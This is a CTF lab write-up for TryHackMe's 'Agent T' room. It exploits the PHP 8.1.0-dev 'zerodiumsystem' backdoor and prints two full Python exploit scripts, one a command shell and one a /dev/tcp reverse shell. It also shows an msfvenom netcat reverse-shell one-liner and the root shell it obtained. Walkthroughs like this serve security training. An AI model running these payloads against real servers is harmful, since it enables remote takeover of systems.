---
categories:
- Tryhackme
- Freetime
- Fundamentals
layout: post
image:
    path: python.png
media_subpath: /assets/posts/2025-03-28-Agent-T-Got-10-Minutes
tags:
- CTF
title: TryHackMe - Got 10 minutes? - Agent T
---

## Introduction

Got an email about this challenge. Message contained following: "Got 10 minutes? Try to find out what is wrong with the server" 


![](images/2025-03-28-18-58.png)

Let's start my ParrotOS to dig deeper of this.

````
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 19:10 EET
Nmap scan report for thm.device
Host is up (0.066s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
````

![](images/2025-03-28-19-59.png)

Really interesting, that there is actually a dashboard to this platform with authenticated "Admin" user. While clicking each link in the site, eventually I ended up to similar site but different user logged in. 

![](images/2025-03-28-19-21.png)

At first I thought could there be a session token in the storage but there was not.
Any of the links in the website did not respond into any actions, so I did another Nmap scan with parameter "-A" to entirely scan the host. 
````
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
````
The version is now known, so let´s see if there is any vulnerabilities related to that.
Matter of fact, there was a RCE Backdoor for this specific version of PHP. (https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914)

It´s about changing the user-agent of the request into "User-agentt" and using payload "zerodiumsysytem("*command*")", this will be executed in the backend server.
Here is a python script from this blog to make the exploitation process persistent, this script belongs to author (https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) - Flast101 :

````
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
````

As expected, we ended up getting a shell using this exploit.

![](images/2025-03-28-19-14.png)

I wanted a better shell and started a netcat listener on Parrot's end but the simple reverse shell commands did not work on this host. MSFVenom could solve this problem.
````
┌─[tigris@parrot]─[~/Desktop]
└──╼ $msfvenom -p cmd/unix/reverse_netcat LHOST=10.x.x.x LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 99 bytes
mkfifo /tmp/tnbsawx; nc 10.x.x.x 4444 0</tmp/tnbsawx | /bin/sh >/tmp/tnbsawx 2>&1; rm /tmp/tnbsawx
````
This did not work either. Then i ended up finding this script, which contained a bash-command for the shell. I tried manually exploit the same command but it did not work and it might be that the earlier backdoor-script will format the request incorrectly. This was also made by flash101 - (https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) - (https://flast101.github.io/php-8.1.0-dev-backdoor-rce/)

````
#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()
````

We are in.

````
┌─[✗]─[tigris@parrot]─[~/Desktop]
└──╼ $netcat -lvnp 4444
listening on [any] 4444 ...
connect to [10.x.x.x] from (UNKNOWN) [10.x.x.x] 35484
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3f8655e43931:/var/www/html#
root@3f8655e43931:/# ls

ls
bin
boot
dev
etc
flag.txt
home

root@3f8655e43931:/# cat flag.txt
flag{412xxxxxxxxxxxxxxxxxxxxxxxxx}
````


